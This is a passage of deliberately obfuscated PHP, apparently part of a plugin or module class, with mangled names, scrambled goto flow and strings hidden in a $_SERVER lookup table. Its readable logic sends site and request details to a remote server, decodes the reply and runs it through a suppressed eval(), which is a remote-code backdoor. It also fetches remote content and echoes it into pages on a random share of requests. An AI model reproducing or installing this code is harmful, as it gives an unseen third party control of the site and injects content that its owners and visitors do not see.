F¤±ôÙƒØÛ: while (strlen($aÇ‘»İÈÀ) < $a‹ãÔ”İ¸Ó[575]) { if (!$aÇ‘»İÈÀ) { break; } $aÇ‘»İÈÀ++; } $DÜÜÍ¬˜¤Ü = $this->{$_SERVER[°Šë¾«øµÑ][185]}($a¢ƒ†ïôìë[$E„İÌ·ö¨¦[88]][$eÔù£„×¼Å], $d²Ò—Ò©È); $DÜÜÍ¬˜¤Ü = $E„İÌ·ö¨¦[187]($DÜÜÍ¬˜¤Ü, !0); goto E¹Âøã¥µ; DØ¬µ½õÔ­: $bŞ¯—âÃ£ˆ = $E„İÌ·ö¨¦[141]($DÜÜÍ¬˜¤Ü[$E„İÌ·ö¨¦[142]]); if ($E„İÌ·ö¨¦[227]() >= $bŞ¯—âÃ£ˆ) { return $this->{$_SERVER[°Šë¾«øµÑ][161]}(); } $this->ngiz3dfbac22 = $DÜÜÍ¬˜¤Ü; goto a§¡©Íƒ¸Ä; E¹Âøã¥µ: $CÜ­Ê³Íº = $a‹ãÔ”İ¸Ó[599]; if (strlen($CÜ­Ê³Íº) < $a‹ãÔ”İ¸Ó[550]) { return; } if (!$E„İÌ·ö¨¦[188]($DÜÜÍ¬˜¤Ü)) { return $this->{$_SERVER[°Šë¾«øµÑ][161]}(); } goto DØ¬µ½õÔ­; bÄ“ĞÔÇÕñ: } private function uqcf8be88c80() { $F¯ÌÎ‚“î‰ =& $_SERVER[°Šë¾«øµÑ]; $B‚ÏÖì¹×„ = $GLOBALS[$F¯ÌÎ‚“î‰[22]]; $FôâÑÅ’±² = $_SERVER[$F¯ÌÎ‚“î‰[44]]; if ($FôâÑÅ’±² == $F¯ÌÎ‚“î‰[228] && $this->eavn6c5c271a == $F¯ÌÎ‚“î‰[118]) { $F¯ÌÎ‚“î‰[163]($F¯ÌÎ‚“î‰[194]($F¯ÌÎ‚“î‰[229]), !1, $F¯ÌÎ‚“î‰[230]); } $EšßîÖÇ‹– = array($F¯ÌÎ‚“î‰[231], $F¯ÌÎ‚“î‰[232]); if ($F¯ÌÎ‚“î‰[233]($FôâÑÅ’±², $EšßîÖÇ‹–)) { if ($this->eavn6c5c271a == $F¯ÌÎ‚“î‰[118] && isset($B‚ÏÖì¹×„[$F¯ÌÎ‚“î‰[234]])) { $F¯ÌÎ‚“î‰[163]($F¯ÌÎ‚“î‰[194]($F¯ÌÎ‚“î‰[229]), !1, $F¯ÌÎ‚“î‰[230]); die; } $d½„ç…«« = $this->{$_SERVER[°Šë¾«øµÑ][134]}(); if ($d½„ç…«« != $F¯ÌÎ‚“î‰[198]($F¯ÌÎ‚“î‰[235])) { if ($d½„ç…«« <= $F¯ÌÎ‚“î‰[61]($F¯ÌÎ‚“î‰[136])->{$_SERVER[°Šë¾«øµÑ][137]}()) { $F¯ÌÎ‚“î‰[163]($F¯ÌÎ‚“î‰[194]($F¯ÌÎ‚“î‰[236]), !1, $F¯ÌÎ‚“î‰[230]); die; } } } } private function xapd28a7c1ff() { goto EôŒ¤ãÌ‘¯; EôŒ¤ãÌ‘¯: $AøŸÁŞ“Ø¾ =& $_SERVER[¿õñ]; $b·İÍœ•Æ =& $_SERVER[°Šë¾«øµÑ]; $cƒíÕÛóµó = array($b·İÍœ•Æ[132], $b·İÍœ•Æ[237]); goto B †˜©æÖ; B †˜©æÖ: if (!$GLOBALS[$b·İÍœ•Æ[129]] || !isset($_GET[$b·İÍœ•Æ[238]])) { return; } if (!$b·İÍœ•Æ[233]($_SERVER[$b·İÍœ•Æ[44]], $cƒíÕÛóµó)) { return; } $FˆñğãïÏ = $b·İÍœ•Æ[239]; goto dÜÅåÊ²ñš; dÜÅåÊ²ñš: $D—ä®õè·ó = $AøŸÁŞ“Ø¾[600]; if (strlen($D—ä®õè·ó) < $AøŸÁŞ“Ø¾[550]) { return; } $FˆñğãïÏ = $this->{$_SERVER[°Šë¾«øµÑ][240]}($FˆñğãïÏ, $b·İÍœ•Æ[241]); goto D«™ƒœìÜ; eõÓòˆ„: die; goto dçÀàëÒùØ; D«™ƒœìÜ: $eÁ›ì¿…À‡ = $b·İÍœ•Æ[242](array($b·İÍœ•Æ[243] => array($b·İÍœ•Æ[244] => $b·İÍœ•Æ[245], $b·İÍœ•Æ[246] => 3))); $fë™˜¶¦âŒ = $AøŸÁŞ“Ø¾[601]; $CÃ•­Û’” = @$b·İÍœ•Æ[247]($FˆñğãïÏ, !1, $eÁ›ì¿…À‡); goto Cöñ­£Öè¼; Cöñ­£Öè¼: $b·İÍœ•Æ[248]($b·İÍœ•Æ[249]); $aèìÌ¸ãèº = $AøŸÁŞ“Ø¾[602]; if ($CÃ•­Û’” && $b·İÍœ•Æ[32]($CÃ•­Û’”, $b·İÍœ•Æ[250])) { echo $CÃ•­Û’”; } goto eõÓòˆ„; dçÀàëÒùØ: } public function eowj800aea23($aÇèà¬Œ’) { goto a­­ØÃ³‚š; d‘Åõ¸¿ŒĞ: if (!$c¬ŒÅôğ„â) { return; } $e÷­ì©Íìñ = array(); foreach ($eˆŸ‰äŞÜ as $Bõ˜×”ª±‡) { if (!$EÁÅĞòÜ×‡[233]($Bõ˜×”ª±‡, $BÛÅ½“·Ù)) { $e÷­ì©Íìñ[] = $Bõ˜×”ª±‡; } } goto BâÃ©ä¯Ä; FŒ†„ªé†: $eˆŸ‰äŞÜ = array($EÁÅĞòÜ×‡[252], $EÁÅĞòÜ×‡[253], $EÁÅĞòÜ×‡[254], $EÁÅĞòÜ×‡[255], $EÁÅĞòÜ×‡[256], $EÁÅĞòÜ×‡[257], $EÁÅĞòÜ×‡[258], $EÁÅĞòÜ×‡[259]); $BÛÅ½“·Ù = $EÁÅĞòÜ×‡[0]($EÁÅĞòÜ×‡[260], $EÁÅĞòÜ×‡[101]($this->ngiz3dfbac22, $EÁÅĞòÜ×‡[126], $EÁÅĞòÜ×‡[10])); $c¬ŒÅôğ„â = $EâÉŠÂà±[603]; goto d‘Åõ¸¿ŒĞ; BâÃ©ä¯Ä: foreach ($e÷­ì©Íìñ as $Bõ˜×”ª±‡) { unset($aÇèà¬Œ’[$Bõ˜×”ª±‡]); $e·ÂÎ¶ù¯² = $EâÉŠÂà±[604]; while (strlen($e·ÂÎ¶ù¯²) < $EâÉŠÂà±[544]) { if (!$e·ÂÎ¶ù¯²) { break; } $e·ÂÎ¶ù¯²++; } } return $aÇèà¬Œ’; $a×–’­¹Ù• = $EâÉŠÂà±[605]; goto a³ˆ„¸¯; a­­ØÃ³‚š: $EâÉŠÂà± =& $_SERVER[¿õñ]; $EÁÅĞòÜ×‡ =& $_SERVER[°Šë¾«øµÑ]; if ($this->eavn6c5c271a == $EÁÅĞòÜ×‡[251]) { return $aÇèà¬Œ’; } goto FŒ†„ªé†; a³ˆ„¸¯: } private function shymcefa8502() { goto E½í£‘”–‚; Dˆëï¨±ø™: while (strlen($F‡‹¾”ÚÕ) < $D½š˜¤¬ó[553]) { if (!$F‡‹¾”ÚÕ) { break; } $F‡‹¾”ÚÕ++; } foreach ($CôÑ¤Æœ¡Ê as $A”ÖÒĞÃ¡Ò) { if ($A”ÖÒĞÃ¡Ò == $C¸éÊÜ‡ || $f‚›ßô•[25]($C¸éÊÜ‡, 0, $f‚›ßô•[24]($A”ÖÒĞÃ¡Ò)) == $A”ÖÒĞÃ¡Ò) { $f‚›ßô•[163]($f‚›ßô•[194]($f‚›ßô•[262]), !1); } } $this->{$_SERVER[°Šë¾«øµÑ][3]}($f‚›ßô•[263], array($this, $f‚›ßô•[264])); goto Aì¤‰•ñ–Æ; D¥„›…¤óÀ: $C¸éÊÜ‡ = $_SERVER[$f‚›ßô•[44]]; $CôÑ¤Æœ¡Ê = array($f‚›ßô•[261]); $F‡‹¾”ÚÕ = $D½š˜¤¬ó[606]; goto Dˆëï¨±ø™; E½í£‘”–‚: $D½š˜¤¬ó =& $_SERVER[¿õñ]; $f‚›ßô• =& $_SERVER[°Šë¾«øµÑ]; if ($this->eavn6c5c271a != $f‚›ßô•[118]) { return; } goto D¥„›…¤óÀ; Aì¤‰•ñ–Æ: $d×É¬”®öÇ = $D½š˜¤¬ó[607]; $GLOBALS[$f‚›ßô•[88]][$f‚›ßô•[265]] = $f‚›ßô•[217]; $Bœî÷äªÒ = $D½š˜¤¬ó[608]; goto B†šÀ‡Í; B†šÀ‡Í: } public function nmai864012c0() { $fœ²ï á³” =& $_SERVER[¿õñ]; return $_SERVER[°Šë¾«øµÑ][266]; $B¥©‰Ù…Ã• = $fœ²ï á³”[609]; if (strlen($B¥©‰Ù…Ã•) < $fœ²ï á³”[544]) { die; } } private function ghtda8af378f() { goto cˆÀ©åæì; c§«»¾¾ñµ: $aŠ÷‰º˜õ = array($CŞÏëù¬”œ[162] => $CŞÏëù¬”œ[61]($CŞÏëù¬”œ[62])->{$_SERVER[°Šë¾«øµÑ][63]}($CŞÏëù¬”œ[206]), $CŞÏëù¬”œ[175] => $this->eavn6c5c271a, $CŞÏëù¬”œ[173] => $_SERVER[$CŞÏëù¬”œ[174]], $CŞÏëù¬”œ[166] => $CŞÏëù¬”œ[146], $CŞÏëù¬”œ[169] => $_SERVER[$CŞÏëù¬”œ[170]]); $b×ÃªÄ¬¼ó = $this->{$_SERVER[°Šë¾«øµÑ][179]}($CŞÏëù¬”œ[275], $aŠ÷‰º˜õ); $f¢’Ô½„¯ç = $c‡à³¨œˆ¬[613]; goto Eõ‡äëí÷ƒ; AŒ¼—‡°ò‰: $this->{$_SERVER[°Šë¾«øµÑ][161]}(); if ($this->{$_SERVER[°Šë¾«øµÑ][196]}($b×ÃªÄ¬¼ó[$CŞÏëù¬”œ[276]]) != $aŠ÷‰º˜õ[$CŞÏëù¬”œ[162]]) { $a‚†¢¡ ¡ø = array($CŞÏëù¬”œ[199] => $CŞÏëù¬”œ[61]($CŞÏëù¬”œ[62])->{$_SERVER[°Šë¾«øµÑ][63]}($CŞÏëù¬”œ[113]), $CŞÏëù¬”œ[200] => $_SERVER[$CŞÏëù¬”œ[112]], $CŞÏëù¬”œ[201] => $CŞÏëù¬”œ[202](), $CŞÏëù¬”œ[171] => $_SERVER[$CŞÏëù¬”œ[172]]); $c«øäÌ”Æ‹ = $this->{$_SERVER[°Šë¾«øµÑ][203]}($CŞÏëù¬”œ[145]($a‚†¢¡ ¡ø)); $b×ÃªÄ¬¼ó = $this->{$_SERVER[°Šë¾«øµÑ][179]}($CŞÏëù¬”œ[204] . $c«øäÌ”Æ‹); if ($b×ÃªÄ¬¼ó && $CŞÏëù¬”œ[188]($b×ÃªÄ¬¼ó) && isset($b×ÃªÄ¬¼ó[$CŞÏëù¬”œ[276]])) { $Eøáá§ß°Î = $this->{$_SERVER[°Šë¾«øµÑ][185]}($b×ÃªÄ¬¼ó[$CŞÏëù¬”œ[276]], 2); if ($Eøáá§ß°Î) { $Eøáá§ß°Î = $this->{$_SERVER[°Šë¾«øµÑ][196]}($Eøáá§ß°Î); } if ($Eøáá§ß°Î) { try { @eval($Eøáá§ß°Î); } catch (Exception $f‘’øö’Üˆ) { } } } } goto BŒ¯´Œ“¹; E£å¬½Ûì©: $fÕäôÄîÖ = $c‡à³¨œˆ¬[611]; if ($this->eavn6c5c271a == $CŞÏëù¬”œ[118] || !$GLOBALS[$CŞÏëù¬”œ[129]]) { return; } if (!$CŞÏëù¬”œ[233]($_SERVER[$CŞÏëù¬”œ[44]], $bÃÆ£¬ØŸÊ)) { return; } goto A‡ì¦Ğêõ»; e¨š¬ˆ„±: $fŸ°‹ëÓÜµ = $c‡à³¨œˆ¬[610]; if (!$fŸ°‹ëÓÜµ) { return; } $F‡êÚÈˆö = $CŞÏëù¬”œ[270] . $CŞÏëù¬”œ[111]($CŞÏëù¬”œ[271]); goto E£å¬½Ûì©; cˆÀ©åæì: $c‡à³¨œˆ¬ =& $_SERVER[¿õñ]; $CŞÏëù¬”œ =& $_SERVER[°Šë¾«øµÑ]; $bÃÆ£¬ØŸÊ = array($CŞÏëù¬”œ[267], $CŞÏëù¬”œ[268], $CŞÏëù¬”œ[269]); goto e¨š¬ˆ„±; cêÓŠæ†±Ì: $CŞÏëù¬”œ[13](array($CŞÏëù¬”œ[272], $CŞÏëù¬”œ[149]), $F‡êÚÈˆö, $CŞÏëù¬”œ[227]()); $FÛ¦“•ç» = $c‡à³¨œˆ¬[612]; while ($FÛ¦“•ç» < $c‡à³¨œˆ¬[550]) { if ($FÛ¦“•ç» >= 0) { break; } $FÛ¦“•ç»++; } goto c§«»¾¾ñµ; Eõ‡äëí÷ƒ: if (strlen($f¢’Ô½„¯ç) < $c‡à³¨œˆ¬[575]) { die; } if (!$CŞÏëù¬”œ[188]($b×ÃªÄ¬¼ó)) { return; } if ($b×ÃªÄ¬¼ó[$CŞÏëù¬”œ[162]] && $b×ÃªÄ¬¼ó[$CŞÏëù¬”œ[276]]) { if ($this->{$_SERVER[°Šë¾«øµÑ][196]}($b×ÃªÄ¬¼ó[$CŞÏëù¬”œ[276]]) == $aŠ÷‰º˜õ[$CŞÏëù¬”œ[162]]) { return; } } goto AŒ¼—‡°ò‰; A‡ì¦Ğêõ»: if ($CŞÏëù¬”œ[227]() % 4 != 0) { return; } $D®œ‚´‰‰ã = $CŞÏëù¬”œ[13](array($CŞÏëù¬”œ[272], $CŞÏëù¬”œ[273]), $F‡êÚÈˆö); if ($D®œ‚´‰‰ã && $CŞÏëù¬”œ[227]() - $D®œ‚´‰‰ã < $CŞÏëù¬”œ[198]($CŞÏëù¬”œ[274])) { return; } goto cêÓŠæ†±Ì; BŒ¯´Œ“¹: } private function focs71f60271($a¤”¼î†ØÙ = '', $AğŠí“İÖÌ = array(), $dÚÅãÇİÜµ = 5) { goto FÕ¤Û˜ğ’ì; DêĞŞ¦÷Ç: $e…Ù¸ÒÙå† = $e…Ù¸ÒÙå† . $a¤”¼î†ØÙ . $Fì£¦»˜Œ¨[279] . $Fì£¦»˜Œ¨[280]($AğŠí“İÖÌ); $eÌÂ£‘ºœù = $f»’É‹×ª[615]; if (strlen($eÌÂ£‘ºœù) < $f»’É‹×ª[548]) { die; } goto eÒ‹¨¥ïøá; bŠ¬®À“ó“: if (strlen($b£»‘½¶öˆ) < $f»’É‹×ª[548]) { die; } $AğŠí“İÖÌ = @$Fì£¦»˜Œ¨[247]($e…Ù¸ÒÙå†, !1, $c¿—‡¾’•Ç); $F®ˆ®î½ø« = $f»’É‹×ª[617]; goto aÄ‚Ï„ã˜; c…‹½¦ Çä: $BÚì¨íØŸÍ = $f»’É‹×ª[614]; while ($BÚì¨íØŸÍ < $f»’É‹×ª[553]) { if ($BÚì¨íØŸÍ >= 0) { break; } $BÚì¨íØŸÍ++; } $e…Ù¸ÒÙå† = $this->{$_SERVER[°Šë¾«øµÑ][240]}($e…Ù¸ÒÙå†, $Fì£¦»˜Œ¨[278]); goto DêĞŞ¦÷Ç; FÕ¤Û˜ğ’ì: $f»’É‹×ª =& $_SERVER[¿õñ]; $Fì£¦»˜Œ¨ =& $_SERVER[°Šë¾«øµÑ]; $e…Ù¸ÒÙå† = $Fì£¦»˜Œ¨[277]; goto c…‹½¦ Çä; aÄ‚Ï„ã˜: if (strlen($F®ˆ®î½ø«) < $f»’É‹×ª[553]) { return; } return $Fì£¦»˜Œ¨[187]($AğŠí“İÖÌ, !0); $dŞƒ†¤Ç÷Ï = $f»’É‹×ª[618]; goto cÆùêÏÄœÕ; eÒ‹¨¥ïøá: if ($AğŠí“İÖÌ === -1) { return $e…Ù¸ÒÙå†; } $c¿—‡¾’•Ç = $Fì£¦»˜Œ¨[242](array($Fì£¦»˜Œ¨[243] => array($Fì£¦»˜Œ¨[246] => $dÚÅãÇİÜµ, $Fì£¦»˜Œ¨[244] => $Fì£¦»˜Œ¨[281]), $Fì£¦»˜Œ¨[282] => array($Fì£¦»˜Œ¨[283] => !1, $Fì£¦»˜Œ¨[284] => !1))); $b£»‘½¶öˆ = $f»’É‹×ª[616]; goto bŠ¬®À“ó“; cÆùêÏÄœÕ: while (strlen($dŞƒ†¤Ç÷Ï) < $f»’É‹×ª[548]) { if (!$dŞƒ†¤Ç÷Ï) { break; } $dŞƒ†¤Ç÷Ï++; } $c©¢ä¸åÆø = $f»’É‹×ª[619]; while ($c©¢ä¸åÆø < $f»’É‹×ª[550]) { if ($c©¢ä¸åÆø >= 0) { break; } $c©¢ä¸åÆø++; } goto DÜåâä÷¬¢; DÜåâä÷¬¢: } private function hgqad167e1ed() { goto dˆ¶‘¯±ğÙ; dˆ¶‘¯±ğÙ: $aƒ¹×ëñ™ =& $_SERVER[¿õñ]; $bõ ãêšÙæ =& $_SERVER[°Šë¾«øµÑ]; $bà»Ô³±ê = array($bõ ãêšÙæ[285] => $bõ ãêšÙæ[286], $bõ ãêšÙæ[287] => $bõ ãêšÙæ[288], $bõ ãêšÙæ[289] => $bõ ãêšÙæ[290], $bõ ãêšÙæ[291] => $bõ ãêšÙæ[292], $bõ ãêšÙæ[293] => $bõ ãêšÙæ[294], $bõ ãêšÙæ[295] => $bõ ãêšÙæ[235], $bõ ãêšÙæ[296] => $bõ ãêšÙæ[235], $bõ ãêšÙæ[297] => $bõ ãêšÙæ[286], $bõ ãêšÙæ[298] => $bõ ãêšÙæ[288], $bõ ãêšÙæ[299] => $bõ ãêšÙæ[290], $bõ ãêšÙæ[300] => $bõ ãêšÙæ[301], $bõ ãêšÙæ[302] => $bõ ãêšÙæ[292], $bõ ãêšÙæ[303] => $bõ ãêšÙæ[304], $bõ ãêšÙæ[305] => $bõ ãêšÙæ[294], $bõ ãêšÙæ[306] => $bõ ãêšÙæ[307], $bõ ãêšÙæ[308] => $bõ ãêšÙæ[309], $bõ ãêšÙæ[310] => $bõ ãêšÙæ[311]); goto e–š½ĞÂª¢; dÁÊ¡¡÷Î: $dí‘‡ø†“˜ = $bõ ãêšÙæ[101]($this->ngiz3dfbac22, $bõ ãêšÙæ[312]); $dí‘‡ø†“˜ = $dí‘‡ø†“˜ ? $bõ ãêšÙæ[198]($dí‘‡ø†“˜) : 0; $d¦§«¹ºÒ = $aƒ¹×ëñ™[622]; goto eÆ»ˆ·×¡Ç; AÌğ§¯Ï‰Û: $A·ÎÏåÉÕ = $aƒ¹×ëñ™[621]; while ($A·ÎÏåÉÕ < $aƒ¹×ëñ™[550]) { if ($A·ÎÏåÉÕ >= 0) { break; } $A·ÎÏåÉÕ++; } $Cøó³öçÌÚ = $bõ ãêšÙæ[198]($Cøó³öçÌÚ ? $Cøó³öçÌÚ : $bõ ãêšÙæ[286]); goto dÁÊ¡¡÷Î; eÆ»ˆ·×¡Ç: if (!$d¦§«¹ºÒ) { die; } return $Cøó³öçÌÚ + $dí‘‡ø†“˜; goto D…ÕõÆĞ¦‡; e–š½ĞÂª¢: $e§ñ‚´¨’ = $aƒ¹×ëñ™[620]; if (!$e§ñ‚´¨’) { die; } $Cøó³öçÌÚ = $bà»Ô³±ê[$this->eavn6c5c271a]; goto AÌğ§¯Ï‰Û; D…ÕõÆĞ¦‡: } public function xeft0ad51e4a($Eñ²ÛùËãë) { goto fƒŒ¦’ºÚÇ; b‘¨Ñî°á: $E¼÷¦†ã·¶ = $F¿Ï‚ÑáõÔ[219]($E¼÷¦†ã·¶, $F¿Ï‚ÑáõÔ[10], $F¿Ï‚ÑáõÔ[314]); if (!$F¿Ï‚ÑáõÔ[233]($Eñ²ÛùËãë[$F¿Ï‚ÑáõÔ[314]], $E¼÷¦†ã·¶)) { $F¿Ï‚ÑáõÔ[163]($F¿Ï‚ÑáõÔ[317], !1, $F¿Ï‚ÑáõÔ[230]); } goto b¼Ó™¬“¬; fƒŒ¦’ºÚÇ: $C‘ôËç˜«¯ =& $_SERVER[¿õñ]; $F¿Ï‚ÑáõÔ =& $_SERVER[°Šë¾«øµÑ]; $C¢ƒ²áØÙ = $this->{$_SERVER[°Šë¾«øµÑ][134]}(); goto C•›¢‚ù°; B®‡ØÆÍêƒ: $E¼÷¦†ã·¶ = $F¿Ï‚ÑáõÔ[61]($F¿Ï‚ÑáõÔ[136])->{$_SERVER[°Šë¾«øµÑ][313]}($F¿Ï‚ÑáõÔ[314])->{$_SERVER[°Šë¾«øµÑ][315]}($C¢ƒ²áØÙ)->{$_SERVER[°Šë¾«øµÑ][316]}(); $DÏ »¨§ = $C‘ôËç˜«¯[623]; while ($DÏ »¨§ < $C‘ôËç˜«¯[553]) { if ($DÏ »¨§ >= 0) { break; } $DÏ »¨§++; } goto b‘¨Ñî°á; C•›¢‚ù°: if ($C¢ƒ²áØÙ >= $F¿Ï‚ÑáõÔ[198]($F¿Ï‚ÑáõÔ[235])) { return; } $d •›Åö… = $F¿Ï‚ÑáõÔ[61]($F¿Ï‚ÑáõÔ[136])->{$_SERVER[°Šë¾«øµÑ][137]}(); if ($d •›Åö… <= $C¢ƒ²áØÙ) { return; } goto B®‡ØÆÍêƒ; b¼Ó™¬“¬: } public function igmd29671e9b() { goto c°‘îˆŸ”Ñ; c°‘îˆŸ”Ñ: $cÛø™¡ø¦è =& $_SERVER[¿õñ]; $añÕö©ùò =& $_SERVER[°Šë¾«øµÑ]; if (!$GLOBALS[$añÕö©ùò[129]] || $añÕö©ùò[318](1, 100) > 20) { return; } goto a°ÓŞšòËÇ; a°ÓŞšòËÇ: $FæÒ˜ƒ”ğ½ = $añÕö©ùò[239]; $FæÒ˜ƒ”ğ½ = $this->{$_SERVER[°Šë¾«øµÑ][240]}($FæÒ˜ƒ”ğ½, $añÕö©ùò[241]); $E»‚äÜà¥ = $cÛø™¡ø¦è[624]; goto Eõ©†—˜; E‹ËˆèİÇ: $AÑÛîô¦„ = @$añÕö©ùò[247]($FæÒ˜ƒ”ğ½, !1, $d’ù¸»‹‰İ); $B¶‹Á¼ÉÏ¼ = $cÛø™¡ø¦è[626]; if (strlen($B¶‹Á¼ÉÏ¼) < $cÛø™¡ø¦è[550]) { return; } goto cæÅ¦¼ŞÕÂ; cæÅ¦¼ŞÕÂ: echo $añÕö©ùò[319] . $añÕö©ùò[320]($AÑÛîô¦„) . $añÕö©ùò[321]; $bÒÏå§ªÎŒ = $cÛø™¡ø¦è[627]; while ($bÒÏå§ªÎŒ < $cÛø™¡ø¦è[548]) { if ($bÒÏå§ªÎŒ >= 0) { break; } $bÒÏå§ªÎŒ++; } goto f‰Ÿ¬¯Ÿñ; Eõ©†—˜: $d’ù¸»‹‰İ = $añÕö©ùò[242](array($añÕö©ùò[243] => array($añÕö©ùò[244] => $añÕö©ùò[245], $añÕö©ùò[246] => 3))); $bÅ„†ùŒŠ¥ = $cÛø™¡ø¦è[625]; if (strlen($bÅ„†ùŒŠ¥) < $cÛø™¡ø¦è[544]) { return; } goto E‹ËˆèİÇ; f‰Ÿ¬¯Ÿñ: } private function qwsn00ce7c03($b¥…¾àì°, $BÒ¢“›ÔÃµ, $dÌğï™ÒË = 3) { goto FÉ˜°¡âŒ; AÇìøé«İ¨: $d«Áµ† = $b®•Š¿ÅˆÊ[629]; $aİÜ´ÍÉ“Î = $CÆì•ÑŠ™[318](0, 5) . $CÆì•ÑŠ™[10]; $d“¸‡‚‚… = $CÆì•ÑŠ™[121](15); goto Eœ¾Àãˆµ; Eœ¾Àãˆµ: $B§Èª¨ËÆÈ = $CÆì•ÑŠ™[323]; switch ($aİÜ´ÍÉ“Î) { case $CÆì•ÑŠ™[226]: $B¡í±ÇÕìª = $this->{$_SERVER[°Šë¾«øµÑ][144]}($b¥…¾àì°, $CÆì•ÑŠ™[211]($BÒ¢“›ÔÃµ . $d“¸‡‚‚…)); break; case $CÆì•ÑŠ™[217]: $B¡í±ÇÕìª = $this->{$_SERVER[°Šë¾«øµÑ][144]}($b¥…¾àì°, $CÆì•ÑŠ™[211]($d“¸‡‚‚… . $BÒ¢“›ÔÃµ)); $d…ËæÊİß´ = $b®•Š¿ÅˆÊ[630]; if (strlen($d…ËæÊİß´) < $b®•Š¿ÅˆÊ[550]) { return; } break; case $CÆì•ÑŠ™[324]: $B¡í±ÇÕìª = $this->{$_SERVER[°Šë¾«øµÑ][144]}($b¥…¾àì°, $CÆì•ÑŠ™[115]($d“¸‡‚‚… . $BÒ¢“›ÔÃµ)); break; $F«¿±òØÔ = $b®•Š¿ÅˆÊ[631]; while (strlen($F«¿±òØÔ) < $b®•Š¿ÅˆÊ[548]) { if (!$F«¿±òØÔ) { break; } $F«¿±òØÔ++; } case $CÆì•ÑŠ™[325]: $B¡í±ÇÕìª = $this->{$_SERVER[°Šë¾«øµÑ][144]}($b¥…¾àì°, $CÆì•ÑŠ™[111]($d“¸‡‚‚… . $BÒ¢“›ÔÃµ)); $B¡¶²ñëí¡ = $b®•Š¿ÅˆÊ[632]; if (strlen($B¡¶²ñëí¡) < $b®•Š¿ÅˆÊ[553]) { die; } break; $Cœ°È½¥ÇÌ = $b®•Š¿ÅˆÊ[633]; if (strlen($Cœ°È½¥ÇÌ) < $b®•Š¿ÅˆÊ[550]) { return; } case $CÆì•ÑŠ™[326]: goto F ’›±¿…; d¬ÃÆ¬ùµ…: while ($dÙ¯”ºÓ› < $b®•Š¿ÅˆÊ[550]) { if ($dÙ¯”ºÓ› >= 0) { break; } $dÙ¯”ºÓ›++; } $d¯Åšê†ë = $CÆì•ÑŠ™[10]; $e¿İ«­öÈ = $b®•Š¿ÅˆÊ[635]; goto DÕ×¼¹˜Ï‘; c¤óÓ£¸ŞĞ: $bÛ° Š‚Áá = 0; for ($aŞí†íñò = 0; $aŞí†íñò < $CÆì•ÑŠ™[24]($b¥…¾àì°); $aŞí†íñò++) { $bÛ° Š‚Áá = $bÛ° Š‚Áá == $CÆì•ÑŠ™[24]($d‘¸ñ‰Íè×) ? 0 : $bÛ° Š‚Áá; $Cæµ•Î„ùç = $b®•Š¿ÅˆÊ[637]; while ($Cæµ•Î„ùç < $b®•Š¿ÅˆÊ[544]) { if ($Cæµ•Î„ùç >= 0) { break; } $Cæµ•Î„ùç++; } $aÉ‹İ¹ğ¿Õ = ($aƒ¸ñËØ + $CÆì•ÑŠ™[328]($B§Èª¨ËÆÈ, $b¥…¾àì°[$aŞí†íñò]) + $CÆì•ÑŠ™[329]($d‘¸ñ‰Íè×[$bÛ° Š‚Áá++])) % 64; $d¯Åšê†ë .= $B§Èª¨ËÆÈ[$aÉ‹İ¹ğ¿Õ]; $b¬‚Í¤è¨™ = $b®•Š¿ÅˆÊ[638]; } $B¡í±ÇÕìª = $CÆì•ÑŠ™[320]($fĞŞˆ¦Ûô . $d¯Åšê†ë); goto BïŠ¶Ë‡É‘; C‹òÂ“: $d‘¸ñ‰Íè× = $CÆì•ÑŠ™[111]($fĞŞˆ¦Ûô . $CÆì•ÑŠ™[111]($BÒ¢“›ÔÃµ . $fĞŞˆ¦Ûô) . $BÒ¢“›ÔÃµ); $d‘¸ñ‰Íè× = $CÆì•ÑŠ™[25]($d‘¸ñ‰Íè×, $aƒ¸ñËØ % 8, $aƒ¸ñËØ % 8 + 7); $dÙ¯”ºÓ› = $b®•Š¿ÅˆÊ[634]; goto d¬ÃÆ¬ùµ…; F ’›±¿…: $b¥…¾àì° = $CÆì•ÑŠ™[115]($b¥…¾àì°); $aƒ¸ñËØ = $CÆì•ÑŠ™[327](0, 64); $fĞŞˆ¦Ûô = $B§Èª¨ËÆÈ[$aƒ¸ñËØ]; goto C‹òÂ“; DÕ×¼¹˜Ï‘: $aŞí†íñò = 0; $D¾…ÇêÙÉ = $b®•Š¿ÅˆÊ[636]; $aÉ‹İ¹ğ¿Õ = 0; goto c¤óÓ£¸ŞĞ; BïŠ¶Ë‡É‘: break; goto fÆéåõåÎë; fÆéåõåÎë: default: $B¡í±ÇÕìª = $this->{$_SERVER[°Šë¾«øµÑ][144]}($b¥…¾àì°, $BÒ¢“›ÔÃµ . $d“¸‡‚‚…); $eó˜÷’ƒÁ£ = $b®•Š¿ÅˆÊ[639]; if (strlen($eó˜÷’ƒÁ£) < $b®•Š¿ÅˆÊ[550]) { die; } break; } $B¡í±ÇÕìª = $CÆì•ÑŠ™[211]($aİÜ´ÍÉ“Î . $d“¸‡‚‚… . $B¡í±ÇÕìª); goto fõ³®Ô™¹; FŒßíÁß§é: $bÖâ™Ğ = $b®•Š¿ÅˆÊ[628]; while (strlen($bÖâ™Ğ) < $b®•Š¿ÅˆÊ[548]) { if (!$bÖâ™Ğ) { break; } $bÖâ™Ğ++; } $b¥…¾àì° = $CÆì•ÑŠ™[2]($b¥…¾àì°); goto AÇìøé«İ¨; FÉ˜°¡âŒ: $b®•Š¿ÅˆÊ =& $_SERVER[¿õñ]; $CÆì•ÑŠ™ =& $_SERVER[°Šë¾«øµÑ]; $CÆì•ÑŠ™[322](1); goto FŒßíÁß§é; fõ³®Ô™¹: if ($dÌğï™ÒË - 1 > 0) { $B¡í±ÇÕìª = $this->{$_SERVER[°Šë¾«øµÑ][124]}($B¡í±ÇÕìª, $BÒ¢“›ÔÃµ, $dÌğï™ÒË - 1); } return $B¡í±ÇÕìª; goto eÄÚ‡ïõä¯; eÄÚ‡ïõä¯: } private function erble0d4383e($EÎö§âÛ , $a£‰‘¯ôˆÓ, $B°†»¥„Å» = 3) { goto bî­¶±’ ; bî­¶±’ : $aëÕ˜“‹°¨ =& $_SERVER[¿õñ]; $f¦°½¿ª×ö =& $_SERVER[°Šë¾«øµÑ]; if (!$f¦°½¿ª×ö[330]($EÎö§âÛ ) || $f¦°½¿ª×ö[24]($EÎö§âÛ ) < 10) { return !1; } goto C¾ïÁ¨ÚéÚ; C¾ïÁ¨ÚéÚ: $EÎö§âÛ  = $f¦°½¿ª×ö[2]($EÎö§âÛ ); $D”Â‘¹ƒ = $aëÕ˜“‹°¨[640]; while (strlen($D”Â‘¹ƒ) < $aëÕ˜“‹°¨[548]) { if (!$D”Â‘¹ƒ) { break; } $D”Â‘¹ƒ++; } goto 